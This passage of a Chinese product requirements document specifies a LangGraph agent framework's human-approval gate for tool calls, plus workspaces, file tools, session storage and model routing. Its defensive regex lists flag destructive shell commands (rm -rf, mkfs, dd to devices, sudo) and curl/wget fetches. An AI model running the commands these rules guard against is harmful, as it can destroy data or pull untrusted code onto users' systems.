        - "docker"              # Docker 操作

    actions:
      high_risk: require_approval
      medium_risk: require_approval
```

**配置示例**(http_fetch):

```yaml
tools:
  http_fetch:
    enabled: true

    rules:
      - pattern: "localhost"
        action: require_approval
        reason: "访问本地服务"

      - pattern: "127\\.0\\.0\\.1"
        action: require_approval
        reason: "访问本地地址"

      - pattern: "192\\.168\\."
        action: require_approval
        reason: "访问内网地址"
```

**支持的 action**:
- `require_approval`: 需要用户批准
- `allow`: 直接允许(跳过审批)
- `deny`: 直接拒绝(禁止执行)

**验收标准**:
- ✅ 支持多风险级别(high_risk/medium_risk/low_risk)
- ✅ 支持正则表达式模式
- ✅ 支持自定义 reason
- ✅ 可通过 enabled: false 临时禁用

**实现参考**:`generalAgent/config/hitl_rules.yaml`、`generalAgent/hitl/approval_checker.py:_check_config_rules`

---

#### 需求 5:自定义检查器(代码实现)

**需求描述**:
支持通过 Python 代码注册自定义审批检查器,实现复杂的审批逻辑(如调用外部 API、多条件判断)。

**注册接口**:

```python
def register_checker(
    tool_name: str,
    checker: Callable[[dict], ApprovalDecision]
):
    """注册工具自定义审批检测函数

    Args:
        tool_name: 工具名称
        checker: 检测函数,接收 args,返回 ApprovalDecision
    """
```

**使用示例**:

```python
# 自定义检查器: 复杂的 bash 命令检测
def check_bash_command_advanced(args: dict) -> ApprovalDecision:
    command = args.get("command", "")

    # 检查是否删除超过 10 个文件
    if "rm" in command:
        file_count = len(re.findall(r'\S+\.(txt|log|tmp)', command))
        if file_count > 10:
            return ApprovalDecision(
                needs_approval=True,
                reason=f"将删除 {file_count} 个文件",
                risk_level="high"
            )

    # 检查是否访问数据库
    if any(db in command for db in ["mysql", "psql", "mongo"]):
        return ApprovalDecision(
            needs_approval=True,
            reason="执行数据库操作",
            risk_level="medium"
        )

    return ApprovalDecision(needs_approval=False)

# 注册检查器
approval_checker.register_checker("run_bash_command", check_bash_command_advanced)
```

**调用外部 API 示例**:

```python
def check_url_reputation(args: dict) -> ApprovalDecision:
    url = args.get("url", "")

    # 调用 VirusTotal API 检查 URL 信誉
    response = requests.get(f"https://virustotal.com/api/v3/urls/{url}")

    if response.json().get("malicious_count", 0) > 0:
        return ApprovalDecision(
            needs_approval=True,
            reason="URL 被标记为恶意站点",
            risk_level="critical"
        )

    return ApprovalDecision(needs_approval=False)

approval_checker.register_checker("http_fetch", check_url_reputation)
```

**验收标准**:
- ✅ 支持注册任意工具的检查器
- ✅ 检查器优先级最高(第一层)
- ✅ 检查器可访问完整的 args 字典
- ✅ 支持异步检查器(async def)

**实现参考**:`generalAgent/hitl/approval_checker.py:register_checker`

---

#### 需求 6:ApprovalToolNode(审批拦截节点)

**需求描述**:
实现 ApprovalToolNode,包装 LangGraph 的 ToolNode,在工具执行前拦截并检查审批需求。

**核心逻辑**:

```python
class ApprovalToolNode:
    async def __call__(self, state: Dict) -> Dict:
        messages = state["messages"]
        last_msg = messages[-1]  # AIMessage with tool_calls

        rejected_calls = []

        # 检查每个 tool_call
        for tool_call in last_msg.tool_calls:
            tool_name = tool_call["name"]
            tool_args = tool_call["args"]

            # 调用 ApprovalChecker
            decision = self.approval_checker.check(tool_name, tool_args)

            if decision.needs_approval:
                # 触发 interrupt(审批对 LLM 透明)
                user_decision = interrupt({
                    "type": "tool_approval",
                    "tool": tool_name,
                    "args": tool_args,
                    "reason": decision.reason,
                    "risk_level": decision.risk_level
                })

                if user_decision == "reject":
                    rejected_calls.append(tool_call)

        # 如果有拒绝,返回拒绝消息
        if rejected_calls:
            return {
                "messages": [
                    ToolMessage(
                        content="❌ 操作已取消: ...",
                        tool_call_id=call["id"]
                    )
                    for call in rejected_calls
                ]
            }

        # 所有通过,正常执行工具
        return await self.tool_node.ainvoke(state)
```

**审批透明性**:

```
关键设计: interrupt() 的数据不进入对话历史

❌ 错误做法:
messages += [HumanMessage("用户批准了操作")]  # 污染历史

✅ 正确做法:
interrupt() → 用户决策 → 直接返回执行结果
                         (审批过程对 LLM 不可见)
```

**用户交互界面**(CLI 实现):

```python
# generalAgent/cli.py
def handle_tool_approval(self, interrupt_data: dict):
    tool = interrupt_data["tool"]
    args = interrupt_data["args"]
    reason = interrupt_data["reason"]
    risk_level = interrupt_data["risk_level"]

    print(f"\n🛡️  工具审批: {tool}")
    print(f"   风险级别: {risk_level}")
    print(f"   原因: {reason}")
    print(f"   参数: {args}")

    choice = input("   批准? [y/n] > ").strip().lower()

    return "approve" if choice == "y" else "reject"
```

**验收标准**:
- ✅ 审批过程对 LLM 完全透明
- ✅ 支持多个 tool_calls 批量检查
- ✅ 拒绝消息以 ToolMessage 形式返回
- ✅ 可通过 enable_approval=False 临时关闭

**实现参考**:`generalAgent/hitl/approval_node.py`

---

#### 需求 7:内置默认规则

**需求描述**:
提供常见危险操作的内置规则作为兜底逻辑,当配置文件未覆盖时自动生效。

**run_bash_command 内置规则**:

```python
def _check_bash_command(command: str) -> ApprovalDecision:
    # 高风险操作
    high_risk_patterns = [
        r"\brm\s+-rf\b",          # rm -rf
        r"\bsudo\b",              # sudo
        r"\bchmod\s+777\b",       # chmod 777
        r"\bmkfs\b",              # 格式化磁盘
        r"\bdd\b.*\bif=/dev/",    # dd 写磁盘
        r"\b>\s*/dev/",           # 重定向到设备
    ]

    for pattern in high_risk_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="检测到高风险操作",
                risk_level="high"
            )

    # 中等风险操作
    medium_risk_patterns = [
        r"\bcurl\b",              # 网络请求
        r"\bwget\b",              # 下载文件
        r"\bgit\s+clone\b",       # 克隆仓库
        r"\bpip\s+install\b",     # 安装 Python 包
        r"\bnpm\s+install\b",     # 安装 Node 包
    ]

    for pattern in medium_risk_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="检测到网络/安装操作",
                risk_level="medium"
            )

    return ApprovalDecision(needs_approval=False)
```

**http_fetch 内置规则**:

```python
def _check_http_fetch(url: str) -> ApprovalDecision:
    # 检查本地/内网地址
    local_patterns = [
        r"localhost",
        r"127\.0\.0\.1",
        r"192\.168\.",
        r"10\.",
        r"172\.(1[6-9]|2[0-9]|3[0-1])\.",  # 172.16-31.x.x
    ]

    for pattern in local_patterns:
        if re.search(pattern, url, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="访问本地/内网地址",
                risk_level="medium"
            )

    return ApprovalDecision(needs_approval=False)
```

**验收标准**:
- ✅ 覆盖常见危险操作(rm -rf, sudo, chmod 777)
- ✅ 检测网络操作(curl, wget)
- ✅ 检测内网地址访问
- ✅ 配置文件规则优先级高于内置规则

**实现参考**:`generalAgent/hitl/approval_checker.py:_check_builtin_rules`

---

### 非功能需求

#### 性能需求

| 指标 | 目标值 | 测量方法 |
|------|--------|---------|
| 审批检查耗时 | <50ms | ApprovalChecker.check() 执行时间 |
| 正则匹配效率 | <10ms | 单个模式匹配时间 |
| interrupt 响应 | <100ms | 触发到用户看到提示的时间 |
| 用户输入超时 | 60s(可配置) | ask_human 等待时间 |

#### 安全性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| 审批透明性 | 审批过程不进入对话历史 | LLM 看不到审批交互 |
| 正则安全性 | 防止 ReDoS 攻击 | 使用安全的正则库 |
| 配置验证 | YAML 格式错误时降级到内置规则 | 异常捕获测试 |
| 拒绝默认 | 用户未输入时默认拒绝 | 超时测试 |

#### 可用性需求

| 需求 | 说明 | 验收标准 |
|------|------|----------|
| 错误提示清晰 | 拒绝原因明确指出风险点 | 用户理解率 100% |
| 审批 UI 简洁 | 信息展示紧凑,不超过 5 行 | UI 评审 |
| 配置易读性 | YAML 注释完整,示例充足 | 开发者 5 分钟上手 |
| 日志可追溯 | 记录所有审批决策 | 审计日志完整性 |

---

### 参考代码位置

| 功能模块 | 代码路径 |
|---------|---------|
| ApprovalChecker | `generalAgent/hitl/approval_checker.py` |
| ApprovalToolNode | `generalAgent/hitl/approval_node.py` |
| 审批规则配置 | `generalAgent/config/hitl_rules.yaml` |
| ask_human 工具 | `generalAgent/tools/builtin/ask_human.py` |
| CLI 审批处理 | `generalAgent/cli.py` (handle_tool_approval) |
| Graph 集成 | `generalAgent/graph/builder.py:111-120` |

---

# 10. 工作区管理

### 产品定位

工作区管理是框架的文件隔离层,为每个会话提供独立的文件空间,支持技能链接、文件上传、输出隔离。通过WorkspaceManager实现路径安全、自动清理、依赖安装等功能。

### 主要功能

工作区管理的详细功能已在以下章节中涵盖:

- **工作区结构** → 参见 **二、技能系统 - 工作区隔离** (第402-410行)
  - `workspace/{session_id}/skills/` - 技能符号链接(只读)
  - `workspace/{session_id}/uploads/` - 用户上传文件
  - `workspace/{session_id}/outputs/` - Agent生成输出
  - `workspace/{session_id}/temp/` - 临时文件

- **技能链接机制** → 参见 **二、技能系统 - 需求4: 技能工作区链接** (第402-425行)
  - 符号链接创建
  - 依赖自动安装
  - 路径安全检查

- **工具路径限制** → 参见 **一、工具系统 - 需求5: 文件操作工具集** (第90-160行)
  - write_file只能写outputs/和temp/
  - read_file可以读skills/和uploads/
  - 路径安全验证

- **工作区继承** → 参见 **八、多Agent协作 - 需求6: 上下文隔离与继承** (第1797-1847行)
  - Subagent继承主Agent的workspace_path
  - 共享uploads/和outputs/目录

### 参考代码位置

| 功能模块 | 文件路径 | 说明 |
|---------|---------|------|
| WorkspaceManager | `shared/workspace/manager.py` | 工作区生命周期管理 |
| 技能链接 | `shared/workspace/manager.py:link_skill()` | 符号链接创建 |
| 依赖安装 | `shared/workspace/manager.py:link_skill()` | requirements.txt处理 |
| 路径验证 | `generalAgent/tools/builtin/file_ops.py` | is_safe_path()检查 |
| 自动清理 | `shared/workspace/manager.py:cleanup_old_workspaces()` | 7天过期清理 |

---

# 11. 文件处理

### 产品定位

文件处理是框架的I/O能力层,提供统一的文件读写、搜索、查找接口,支持多种文档格式(PDF/DOCX/XLSX/PPTX)的自动解析和索引。

### 主要功能

文件处理的详细功能已在以下章节中涵盖:

- **文件操作工具集** → 参见 **一、工具系统 - 需求5: 文件操作工具集** (第85-160行)
  - `read_file`: 读取文本和文档(支持PDF/DOCX/XLSX/PPTX预览)
  - `write_file`: 写入文件到outputs/或temp/
  - `edit_file`: 基于diff的精确编辑
  - `find_files`: Glob模式文件名搜索
  - `search_file`: 全文内容搜索(支持文档索引)
  - `list_workspace_files`: 列出工作区文件

- **文档格式支持** → 参见 **一、工具系统 - read_file工具** (第85-110行)
  - PDF: 分页预览,前10页或全文
  - DOCX: 段落预览,前10页或全文
  - XLSX: 工作表预览,前3个sheet
  - PPTX: 幻灯片预览,前15张
  - 文本文件: 直接读取(<100KB)或截断(>100KB)

- **文档索引与搜索** → 参见 **一、工具系统 - search_file工具** (第140-160行)
  - FTS5全文索引(SQLite)
  - MD5去重(跨会话复用索引)
  - 多策略评分:短语(10分) > 三元组(5分) > 二元组(3分) > 关键词(2分)
  - 自动索引构建(首次2-5秒,后续<100ms)

- **文件上传自动处理** → 参见 **二、技能系统 - 需求2: 文件上传自动加载** (第330-360行)
  - 上传PDF自动加载@pdf技能
  - 上传DOCX自动加载@docx技能
  - 动态hints生成

### 核心特性

#### 文档预览策略

**小文件**(≤阈值):
- PDF/DOCX: ≤10页 → 全文返回
- XLSX: ≤3个sheet → 全部返回
- PPTX: ≤15张幻灯片 → 全部返回

**大文件**(>阈值):
- 返回前N页/sheet/幻灯片预览
- 提示使用search_file搜索具体内容
- 避免Token浪费

#### 索引管理

**全局索引存储**:
- 路径: `data/indexes/{md5[:2]}/{md5}.db`
- 两级目录结构(避免单目录文件过多)
- 跨会话复用(相同内容共享索引)

**自动清理**:
- 文件替换时删除旧索引(MD5变化)
- 定期清理孤儿索引(24小时未访问)

### 参考代码位置

| 功能模块 | 文件路径 | 说明 |
|---------|---------|------|
| 文件操作工具 | `generalAgent/tools/builtin/file_ops.py` | read/write/edit/list |
| 文件查找 | `generalAgent/tools/builtin/find_files.py` | Glob模式搜索 |
| 文件搜索 | `generalAgent/tools/builtin/search_file.py` | 全文搜索+索引 |
| 文档提取器 | `generalAgent/utils/document_extractors.py` | PDF/DOCX/XLSX/PPTX解析 |
| 文本索引器 | `generalAgent/utils/text_indexer.py` | FTS5索引构建 |
| 索引管理器 | `generalAgent/utils/text_indexer.py:TextIndexManager` | MD5去重、自动清理 |

---

# 12. 会话管理

### 产品定位

会话管理是框架的持久化层,负责保存和恢复完整的对话状态,支持断点续聊、多会话并发、快速切换。通过SQLite Checkpointer实现轻量级持久化,恢复时间<500ms。

### 主要功能

会话管理的详细功能已在 **六、上下文管理** 章节中涵盖:

- **会话持久化** → 参见 **六、上下文管理 - 需求3: 会话持久化** (第2933-2970行)
  - SQLite存储完整AppState
  - 支持1000+并发会话
  - 恢复时间<500ms
  - CLI命令:`/sessions`, `/load`, `/reset`, `/current`

- **断点续聊** → 参见 **六、上下文管理 - 场景2: 会话断点续聊** (第2842-2870行)
  - 完整状态恢复:messages, tools, skills, workspace
  - 跨设备续聊(共享data/sessions.db)
  - 自动保存策略(每轮对话后)

### 核心特性

#### CLI命令

| 命令 | 功能 | 示例 |
|------|------|------|
| `/sessions` | 列出所有保存的会话 | 显示session_id, 创建时间, 消息数 |
| `/load <id>` | 加载指定会话 | `/load abc123`(支持前缀匹配) |
| `/reset` | 重置当前会话 | 清空messages,保留配置 |
| `/current` | 显示当前会话信息 | session_id, loops, token使用 |
| `/clean` | 清理过期工作区 | 删除7天以上的workspace |

#### 持久化数据

**完整AppState保存**:
- `messages`: 对话历史(所有消息)
- `mentioned_agents`: @mentioned工具/技能/agents
- `active_skill`: 当前激活技能
- `workspace_path`: 工作区路径
- `uploaded_files`: 已上传文件列表
- `todos`: 任务列表
- `loops`: 循环计数
- `cumulative_prompt_tokens`: Token累计使用

**不保存**:
- 临时状态(needs_compression等)
- 运行时对象(model_registry等)

#### 性能指标

| 指标 | 目标值 | 实际表现 |
|------|--------|----------|
| 恢复时间 | <500ms | ~300ms(50条消息) |
| 并发会话 | 1000+ | SQLite支持 |
| 存储空间 | <1MB/会话 | ~500KB(100条消息) |
| 查询性能 | <50ms | 索引优化 |

### 技术实现

#### SQLite Checkpointer

```python
from langgraph.checkpoint.sqlite import SqliteSaver

# 创建checkpointer
checkpointer = SqliteSaver.from_conn_string("data/sessions.db")

# 应用绑定
app = builder.compile(checkpointer=checkpointer)

# 运行时配置
config = {"configurable": {"thread_id": session_id}}
result = await app.ainvoke(initial_state, config=config)
```

#### 会话ID生成

```python
import uuid

# 生成唯一session_id
session_id = uuid.uuid4().hex[:12]  # 12字符,足够唯一

# 或使用时间戳+随机
session_id = f"{int(time.time())}-{random.randint(1000, 9999)}"
```

#### 前缀匹配加载

```python
def load_session(prefix: str) -> str:
    """根据前缀匹配加载会话

    支持:
    - /load abc      → 匹配 abc12345678
    - /load abc123   → 精确匹配
    """
    sessions = list_all_sessions()
    matches = [s for s in sessions if s["id"].startswith(prefix)]

    if len(matches) == 0:
        raise ValueError(f"未找到匹配的会话: {prefix}")
    if len(matches) > 1:
        raise ValueError(f"找到多个匹配会话: {[m['id'] for m in matches]}")

    return matches[0]["id"]
```

### 与工作区的关系

**会话与工作区绑定**:
- 每个session_id对应一个workspace: `data/workspace/{session_id}/`
- 加载会话时自动恢复workspace_path
- 工作区独立于会话持久化(7天后自动清理)

**清理策略**:
- 会话永久保存(除非手动删除)
- 工作区7天自动清理(释放磁盘空间)
- 清理时保留会话记录(messages仍可查看)

### 参考代码位置

| 功能模块 | 文件路径 | 说明 |
|---------|---------|------|
| 会话存储 | `shared/session/store.py` | SessionStore实现 |
| 会话管理器 | `shared/session/manager.py` | SessionManager生命周期 |
| Checkpointer | `generalAgent/persistence/session_store.py` | SQLite Checkpointer配置 |
| CLI命令 | `shared/cli/base_cli.py` | /sessions, /load, /reset |
| 前缀匹配 | `shared/session/manager.py:load_session()` | 前缀匹配逻辑 |
| 工作区清理 | `shared/workspace/manager.py:cleanup_old_workspaces()` | 7天过期清理 |

---

**参见其他章节**:
- 六、上下文管理 - 会话持久化详细实现(第2933-2970行)
- 九、工作区管理 - 工作区与会话的关系(第3276-3315行)

---

# 7. 模型路由系统

### 产品定位

模型路由系统是框架的智能调度层,负责根据任务特征(图像输入、代码生成、复杂推理)自动选择最合适的模型槽位。通过五种模型槽位(base/reason/vision/code/chat)和启发式路由策略,实现成本与性能的最优平衡。

**价值主张**:
- **智能选择**:自动检测任务类型,匹配最佳模型(如检测到图片自动使用vision模型)
- **成本优化**:快速任务使用base模型,复杂推理使用reason模型,按需分配
- **灵活配置**:通过.env文件配置不同供应商模型(DeepSeek/Moonshot/GLM等)
- **统一接口**:ModelResolver抽象屏蔽模型差异,支持OpenAI-compatible API

---

### 核心场景

#### 场景 1:自动多模态切换

**用户故事**:
用户上传一张架构图并询问:"这个系统的瓶颈在哪里?"

**系统行为**:
1. Planner节点检测到最近3条消息中有图片(image_url类型)
2. `_detect_multimodal_input()`返回`need_vision=True`
3. ModelRegistry选择vision槽位模型(如glm-4.5v)
4. Agent使用多模态模型分析图片内容
5. 返回分析结果,包含对架构图的理解

**关键点**:
- 自动检测图片,无需用户指定
- Vision优先策略(即使不需要工具调用也使用vision模型)
- 支持image/image_url两种格式

---

#### 场景 2:代码生成专用模型

**用户故事**:
用户请求:"帮我生成一个React组件,实现拖拽排序功能"

**系统行为**:
1. Planner节点调用`invoke_planner(need_code=True)`
2. ModelRegistry选择code槽位模型(如deepseek-chat)
3. Agent使用代码专用模型生成高质量代码
4. 通过write_file工具保存代码到workspace

**关键点**:
- 代码生成任务使用专用模型(更高质量)
- Code模型支持工具调用(can_tools=True)
- 速度和质量平衡(speed=normal, quality=high)

---

#### 场景 3:复杂推理任务

**用户故事**:
用户询问:"分析一下为什么这个算法会超时,给出3种优化方案并评估复杂度"

**系统行为**:
1. 用户可选择使用@reasoning标记或系统自动检测
2. Planner调用`invoke_planner(preference='reasoning')`
3. ModelRegistry选择reason槽位模型(如deepseek-reasoner)
4. Agent进行深度思考链推理
5. 返回详细的分析和优化方案

**关键点**:
- Reasoning模型专注复杂任务(domain=reasoning)
- 支持工具调用(can_tools=True)
- 更高质量但速度较慢(speed=slow, quality=high)

---

### 功能需求

#### 需求 1:五种模型槽位定义

**功能描述**:
系统支持五种模型槽位,每种槽位对应特定能力和使用场景。

**模型槽位**:

| 槽位 | 能力 | 多模态 | 工具调用 | 领域 | 速度 | 质量 | 使用场景 |
|------|------|--------|----------|------|------|------|----------|
| base | 通用 | ❌ | ❌ | general | fast | low | 快速响应、简单任务 |
| reason | 推理 | ❌ | ✅ | reasoning | slow | high | 复杂逻辑、深度分析 |
| vision | 视觉 | ✅ | ❌ | general | normal | med | 图片分析、多模态 |
| code | 代码 | ❌ | ✅ | code | normal | high | 代码生成、审查 |
| chat | 对话 | ❌ | ✅ | chat | normal | med | 主对话流程 |

**配置示例**(.env):
```bash
# Base模型 - 快速响应
MODEL_BASIC_ID=deepseek-chat
MODEL_BASIC_API_KEY=sk-xxx
MODEL_BASIC_BASE_URL=https://api.deepseek.com
MODEL_BASE_CONTEXT_WINDOW=128000
MODEL_BASE_MAX_COMPLETION_TOKENS=2048

# Reasoning模型 - 复杂推理
MODEL_REASONING_ID=deepseek-reasoner
MODEL_REASONING_API_KEY=sk-xxx
MODEL_REASONING_CONTEXT_WINDOW=64000
MODEL_REASONING_MAX_COMPLETION_TOKENS=8000

# Vision模型 - 多模态
MODEL_MULTIMODAL_ID=glm-4.5v
MODEL_MULTIMODAL_API_KEY=xxx
MODEL_MULTIMODAL_BASE_URL=https://open.bigmodel.cn/api/paas/v4
MODEL_VISION_CONTEXT_WINDOW=128000

# Code模型 - 代码生成
MODEL_CODE_ID=deepseek-chat
MODEL_CODE_API_KEY=sk-xxx
MODEL_CODE_CONTEXT_WINDOW=128000

# Chat模型 - 主对话
MODEL_CHAT_ID=kimi-k2-0905-preview
MODEL_CHAT_API_KEY=xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_CONTEXT_WINDOW=256000
```

**验收标准**:
- ✅ 五种槽位均可独立配置model_id、api_key、base_url
- ✅ 每个槽位支持context_window和max_completion_tokens配置
- ✅ 支持多种别名(如MODEL_BASIC_*/MODEL_BASE_*均可)
- ✅ 缺少API Key时抛出清晰错误提示

---

#### 需求 2:ModelSpec模型规格定义

**功能描述**:
使用ModelSpec数据类标准化模型元数据,包含能力标记、性能特征、上下文窗口。

**数据结构**:
```python
@dataclass(frozen=True, slots=True)
class ModelSpec:
    key: ModelKey              # 槽位标识(base/reason/vision/code/chat)
    model_id: str              # 实际模型ID(如deepseek-chat)
    can_tools: bool            # 是否支持工具调用
    multimodal: bool           # 是否支持多模态(图片)
    domain: str                # 领域(general/reasoning/code/chat)
    speed: str                 # 速度(fast/normal/slow)
    quality: str               # 质量(low/med/high)
    context_window: int        # 上下文窗口大小(tokens)
```

**验收标准**:
- ✅ ModelSpec为frozen dataclass(不可变)
- ✅ 包含8个字段,涵盖模型所有关键属性
- ✅ 支持通过ModelRegistry.get(key)查询
- ✅ 用于ModelRegistry路由决策

**参考代码位置**:
- `generalAgent/models/registry.py:11-23` - ModelSpec定义
- `generalAgent/models/registry.py:73-135` - build_default_registry()

---

#### 需求 3:ModelRegistry注册与路由

**功能描述**:
ModelRegistry负责存储所有ModelSpec,并提供启发式路由策略选择最佳模型。

**核心方法**:

**3.1 register(spec: ModelSpec)**
- 注册ModelSpec到内部字典
- 使用key(base/reason/vision/code/chat)作为索引

**3.2 get(key: ModelKey) -> ModelSpec**
- 根据key查询ModelSpec
- 不存在时抛出KeyError

**3.3 prefer(...) -> ModelSpec** (核心路由逻辑)
- 根据任务特征选择最佳模型
- 参数:
  - `phase`: 执行阶段(plan/delegate)
  - `require_tools`: 是否需要工具调用
  - `need_code`: 是否代码生成任务
  - `need_vision`: 是否需要处理图片
  - `preference`: 用户偏好(reasoning等)

**路由策略**:
```python
# 优先级1: Vision优先(检测到图片且不需工具)
if need_vision and not require_tools:
    return get("vision")

# 优先级2: 工具调用场景
if require_tools:
    if need_code:
        return get("code")       # 代码生成
    if preference == "reasoning":
        return get("reason")     # 复杂推理
    return get("chat")           # 默认对话

# 优先级3: 无工具场景
if preference == "reasoning":
    return get("reason")         # 推理偏好
return get("base")               # 默认快速模型
```

**验收标准**:
- ✅ 图片输入自动触发vision模型
- ✅ 代码任务自动选择code模型
- ✅ 支持preference参数覆盖默认选择
- ✅ 路由逻辑稳定可预测

**参考代码位置**:
- `generalAgent/models/registry.py:25-71` - ModelRegistry实现
- `generalAgent/models/registry.py:46-70` - prefer()路由逻辑

---

#### 需求 4:ModelResolver模型实例化

**功能描述**:
ModelResolver是一个协议(Protocol),负责根据model_id返回LangChain兼容的ChatOpenAI实例。采用惰性实例化策略,仅在使用时创建模型对象。

**接口定义**:
```python
class ModelResolver(Protocol):
    def __call__(self, model_id: str) -> ChatOpenAI:
        ...
```

**实现流程**:
1. `resolve_model_configs(settings)` - 从.env提取五个槽位配置
2. `build_model_resolver(configs)` - 构建resolver函数
3. 返回resolver:根据model_id创建ChatOpenAI实例

**配置转换**:
```python
# .env配置
MODEL_CHAT_ID=kimi-k2-0905-preview
MODEL_CHAT_API_KEY=sk-xxx
MODEL_CHAT_BASE_URL=https://api.moonshot.cn/v1
MODEL_CHAT_MAX_TOKENS=4096

# 转换为ModelConfig
{
    "chat": {
        "id": "kimi-k2-0905-preview",
        "api_key": "sk-xxx",
        "base_url": "https://api.moonshot.cn/v1",
        "context_window": 256000,
        "max_completion_tokens": 4096
    }
}

# resolver调用
model = resolver("kimi-k2-0905-preview")
# 返回: ChatOpenAI(model="kimi-k2-0905-preview", api_key="...", base_url="...")
```

**验收标准**:
- ✅ 支持自定义base_url(OpenAI-compatible API)
- ✅ 缺少API Key时抛出RuntimeError并给出清晰提示
- ✅ 支持model_id不在配置中时的KeyError
- ✅ 惰性实例化(仅在调用时创建对象)

**参考代码位置**:
- `generalAgent/agents/interfaces.py:8-12` - ModelResolver协议定义
- `generalAgent/runtime/model_resolver.py:55-108` - resolve_model_configs()
- `generalAgent/runtime/model_resolver.py:143-177` - build_model_resolver()

---

#### 需求 5:自动多模态检测

**功能描述**:
Planner节点在调用LLM前自动检测最近消息中的图片和代码,设置need_vision/need_code标志。

**检测逻辑**:
```python
def _detect_multimodal_input(messages: List[BaseMessage]) -> tuple[bool, bool]:
    has_images = False
    has_code = False

    # 检查最近3条消息
    for msg in messages[-3:]:
        content = getattr(msg, "content", "")

        # 检测图片(list格式,type为image或image_url)
        if isinstance(content, list):
            for item in content:
                if isinstance(item, dict):
                    if item.get("type") in ("image", "image_url"):
                        has_images = True

    return has_images, has_code
```

**调用时机**:
```python
# Planner节点调用LLM前
has_images, has_code = _detect_multimodal_input(state["messages"])

response = await invoke_planner(
    model_registry=model_registry,
    model_resolver=model_resolver,
    tools=visible_tools,
    messages=messages,
    need_code=has_code,
    need_vision=has_images,
    preference=None
)
```

**验收标准**:
- ✅ 检测最近3条消息(覆盖用户输入+Agent响应周期)
- ✅ 支持image和image_url两种格式
- ✅ 检测结果直接传递给invoke_planner()
- ✅ Vision优先策略在路由中生效

**参考代码位置**:
- `generalAgent/graph/nodes/planner.py:41-67` - _detect_multimodal_input()
- `generalAgent/graph/nodes/planner.py:200-220` - Planner节点调用

---

#### 需求 6:invoke_planner统一调用接口

**功能描述**:
提供统一的LLM调用接口,封装ModelRegistry查询、ModelResolver实例化、工具绑定流程。

**函数签名**:
```python
async def invoke_planner(
    *,
    model_registry: ModelRegistry,
    model_resolver: ModelResolver,
    tools: Iterable[BaseTool],
    messages: List[BaseMessage],
    need_code: bool = False,
    need_vision: bool = False,
    preference: str | None = None,
) -> AIMessage:
```

**执行流程**:
1. 调用`model_registry.prefer()`获取ModelSpec
2. 使用`model_resolver(spec.model_id)`创建模型实例
3. 绑定工具:`model.bind_tools(list(tools))`
4. 调用模型:`await runnable.ainvoke(messages)`
5. 返回AIMessage(包含tool_calls)

**使用示例**:
```python
# 普通对话
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"]
)

# 代码生成
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"],
    need_code=True
)

# 复杂推理
response = await invoke_planner(
    model_registry=registry,
    model_resolver=resolver,
    tools=visible_tools,
    messages=state["messages"],
    preference="reasoning"
)
```

**验收标准**:
- ✅ 所有模型调用统一经过此接口
- ✅ 自动处理模型选择和实例化
- ✅ 支持异步调用(async/await)
- ✅ 返回标准AIMessage格式

**参考代码位置**:
- `generalAgent/agents/factory.py:15-36` - invoke_planner()实现
- `generalAgent/agents/factory.py:39-58` - invoke_subagent()(类似逻辑)

---

#### 需求 7:Subagent模型继承

**功能描述**:
delegated subagent使用独立的invoke_subagent()接口,但复用相同的ModelRegistry和ModelResolver。

**与主Agent的差异**:
- 使用`phase="delegate"`(而非"plan")
- 不支持preference参数(简化逻辑)
- 其他路由逻辑相同(vision优先、code检测等)

**调用示例**:
```python
# Subagent节点
response = await invoke_subagent(
    model_registry=model_registry,
    model_resolver=model_resolver,
    tools=subagent_tools,
    messages=subagent_messages,
    need_code=has_code,
    need_vision=has_images
)
```

**验收标准**:
- ✅ Subagent与主Agent使用相同的模型配置
- ✅ 支持need_code和need_vision参数
- ✅ 不支持preference参数
- ✅ Phase标记为"delegate"便于观测

**参考代码位置**:
- `generalAgent/agents/factory.py:39-58` - invoke_subagent()
- `generalAgent/graph/nodes/planner.py:300-350` - Subagent节点调用

---

### 非功能需求

#### NFR-MODEL-1:成本优化

**要求**:
- base模型用于快速任务,降低80%成本
- reason模型仅在复杂推理时使用
- 自动选择策略减少人工干预

**衡量标准**:
- 90%以上任务使用chat/base模型
- reason模型调用占比<5%
- 用户满意度>85%

---

#### NFR-MODEL-2:性能要求

**要求**:
- ModelRegistry.prefer()延迟<1ms
- ModelResolver实例化延迟<50ms
- 模型切换对用户透明(无感知)

**衡量标准**:
- 路由决策时间<1ms
- 首次模型调用延迟<100ms(包含网络)
- 后续调用复用连接

---

#### NFR-MODEL-3:可扩展性

**要求**:
- 支持添加新的模型槽位(如embedding/tts)
- 支持自定义路由策略
- 配置与代码分离

**实现方式**:
- ModelSpec可扩展(添加新字段)
- prefer()逻辑可覆盖
- .env配置驱动

---

#### NFR-MODEL-4:兼容性

**要求**:
- 支持OpenAI-compatible API
- 支持DeepSeek/Moonshot/GLM/Qwen等国内模型
- 支持自定义base_url

**验收标准**:
- ✅ 测试至少3家供应商模型
- ✅ 自定义base_url功能正常
- ✅ 缺少API Key时错误提示清晰

---

### 参考代码位置

| 功能模块 | 文件路径 | 说明 |
|---------|---------|------|
| ModelSpec定义 | `generalAgent/models/registry.py:11-23` | 模型规格数据类 |
| ModelRegistry | `generalAgent/models/registry.py:25-71` | 注册表和路由逻辑 |
| build_default_registry | `generalAgent/models/registry.py:73-135` | 默认注册表构建 |
| ModelResolver协议 | `generalAgent/agents/interfaces.py:8-12` | 接口定义 |
| resolve_model_configs | `generalAgent/runtime/model_resolver.py:55-108` | 配置解析 |
| build_model_resolver | `generalAgent/runtime/model_resolver.py:143-177` | Resolver构建 |
| invoke_planner | `generalAgent/agents/factory.py:15-36` | 主Agent调用 |
| invoke_subagent | `generalAgent/agents/factory.py:39-58` | Subagent调用 |
| _detect_multimodal_input | `generalAgent/graph/nodes/planner.py:41-67` | 多模态检测 |
| Planner节点集成 | `generalAgent/graph/nodes/planner.py:200-220` | 模型选择调用 |
| Settings配置 | `generalAgent/config/settings.py:40-90` | ModelRoutingSettings |
| 应用初始化 | `generalAgent/runtime/app.py:150-200` | Registry和Resolver装配 |

---


# 9. Agent 模板系统

## 产品定位
